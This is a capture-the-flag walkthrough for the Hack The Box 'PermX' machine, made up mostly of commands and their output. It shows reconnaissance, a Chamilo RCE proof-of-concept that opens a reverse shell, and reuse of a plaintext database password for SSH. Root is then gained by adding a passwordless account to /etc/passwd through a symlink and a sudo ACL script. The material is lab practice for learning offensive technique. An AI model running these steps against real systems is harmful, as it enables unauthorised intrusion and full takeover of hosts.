# PermX-https://www.hackthebox.com/machines/permx

```bash
 ping 10.129.165.252
PING 10.129.165.252 (10.129.165.252) 56(84) bytes of data.
64 bytes from 10.129.165.252: icmp_seq=1 ttl=63 time=65.6 ms
64 bytes from 10.129.165.252: icmp_seq=2 ttl=63 time=64.1 ms
64 bytes from 10.129.165.252: icmp_seq=3 ttl=63 time=69.0 ms
^C
--- 10.129.165.252 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 64.094/66.249/69.042/2.069 ms


nmap -sV -sC 10.129.165.252
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 09:19 EDT
Nmap scan report for 10.129.165.252
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache/2.4.52 (Ubuntu)
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.10 seconds

# We can't connect to http://10.129.165.252 and we are getting redirected to permx.htb.
# To make this redirect process work, we need to add the IP address of the machine in our local dns file (/etc/hosts)

sudo nano /etc/hosts

10.129.165.252  permx.htb

# Now, we can acess the website.

ffuf -u http://permx.htb -H "Host: FUZZ.permx.htb" -w //usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 66ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1245ms]
:: Progress: [114441/114441] :: Job [1/1] :: 617 req/sec :: Duration: [0:05:18] :: Errors: 240 ::
                                                                                    

# Add this to /etc/hosts to be able to reach subdomain.
10.129.165.252  permx.htb lms.permx.htb

# We see a login page

whatweb http://lms.permx.htb/
http://lms.permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux]
[Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.129.165.252], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal],
 X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]

# Let's check Chamilo 1 exploits X-Powered-By[Chamilo 1]
# https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc

python3 main.py -u http://lms.permx.htb/ -a revshell

# I only changed Ip adress and port hit enter to other settings.

nc -nvlp 1234  
listening on [any] 1234 ...
connect to [10.10.14.24] from (UNKNOWN) [10.129.165.252] 57240
bash: cannot set terminal process group (1152): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 

ww-data@permx:/$ find . -name configuration*                                          
find . -name configuration*
find: './root': Permission denied
find: './home/mtz': Permission denied
find: './lost+found': Permission denied
find: './proc/tty/driver': Permission denied
find: './run/udisks2': Permission denied
find: './run/sudo': Permission denied
find: './run/multipath': Permission denied
find: './run/cryptsetup': Permission denied
find: './run/credentials': Permission denied
find: './run/systemd/incoming': Permission denied
find: './run/systemd/propagate': Permission denied
find: './run/systemd/unit-root': Permission denied
find: './run/systemd/inaccessible/dir': Permission denied
find: './run/lvm': Permission denied
find: './run/lock/lvm': Permission denied
find: './run/initramfs': Permission denied
find: './boot/lost+found': Permission denied
./var/www/chamilo/main/install/configuration.dist.php
./var/www/chamilo/app/Resources/public/assets/chart.js/docs/configuration
./var/www/chamilo/app/config/configuration.php

www-data@permx:/$ cat /var/www/chamilo/app/config/configuration.php
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;

www-data@permx:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false

# Let's try to login with this password 03F6lY3uXAP2bkW8 to bash users.
ssh root@10.129.165.252
The authenticity of host '10.129.165.252 (10.129.165.252)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.165.252' (ED25519) to the list of known hosts.
root@10.129.165.252's password: 
Permission denied, please try again.
root@10.129.165.252's password: 
Permission denied, please try again.
root@10.129.165.252's password: 

                                                                                                   
ssh mtz@10.129.165.252
mtz@10.129.165.252's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Sep 11 07:01:20 AM UTC 2024

  System load:           0.0
  Usage of /:            59.3% of 7.19GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             220
  Users logged in:       0
  IPv4 address for eth0: 10.129.165.252
  IPv6 address for eth0: dead:beef::250:56ff:fe94:26fa


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
mtz@permx:~$ id
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
mtz@permx:~$ ls
user.txt
mtz@permx:~$ cat user.txt
25ffae16af7cf882c8a086224b765919
```
```bash
# I will try sudo -l first if it doesn'T work we can try linpeas.sh
mtz@permx:~$ sudo -l
/opt/acl.sh
mtz@permx:~$ ln -s /etc/passwd /home/mtz/test
mtz@permx:~$ ls -l /home/mtz/test
lrwxrwxrwx 1 mtz mtz 11 Sep 11 08:00 /home/mtz/test -> /etc/passwd
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/test
mtz@permx:~$ echo "root3::0:0:root3:/root:/bin/bash" >> ./test
mtz@permx:~$ su root3
root@permx:/home/mtz# ls
test  user.txt
root@permx:/home/mtz# cd /root
root@permx:~# cat root.txt
004242b1b06eb94e11c65e695912e5fe


# This works but i had lots of connection problem in this machine and i had to keep repeat the mtz@permx:~$ ln -s /etc/passwd /home/mtz/test part again and again
# until could complete everything before losing connection if you experience something similar just check your connection by pinging server. I really hate this machine because of it.
```
